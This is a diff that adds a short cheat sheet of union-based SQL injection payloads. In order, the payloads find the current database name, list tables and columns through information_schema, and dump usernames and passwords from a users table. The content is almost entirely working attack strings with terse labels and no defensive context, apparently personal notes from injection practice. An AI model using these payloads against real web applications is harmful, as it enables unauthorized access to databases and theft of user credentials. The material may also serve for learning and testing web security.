@@ -1,0 +1,10 @@
+1'union select 1,2,3,--+
+1'union select 1,2,database(),5--+
+
+find table name -> 1'union select 1,2,3,group_concat(table_name),5 from information_schema.tables where table_schema=database()--+
+
+info-from columns  -> 1'union select 1,2,group_concat(column_name),3 from information_schema.columns where table_name='users' --+
+
+1' union select 1,2,group_concat(username,password),5 from users--+
+
+union select column_name1,column_name2 from table_name -> union select user,password from users
